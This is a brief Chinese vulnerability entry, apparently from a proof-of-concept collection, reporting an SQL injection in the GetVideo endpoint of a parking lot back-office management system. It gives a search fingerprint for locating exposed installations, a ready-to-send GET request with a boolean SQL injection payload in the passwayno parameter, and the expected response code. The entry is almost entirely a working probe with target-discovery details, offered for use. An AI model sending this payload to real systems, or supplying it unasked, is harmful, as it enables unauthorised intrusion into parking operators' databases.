# 停车场后台管理系统GetVideo存在SQL注入漏洞

停车场后台管理系统 ｜ SQL注入 ｜ —
- **指纹**：`title="智能停车管理系统"`
- **请求**：`GET /LaneMonitor/GetVideo?passwayno=1'+and+'2'='1 HTTP/1.1`
- **响应特征**：200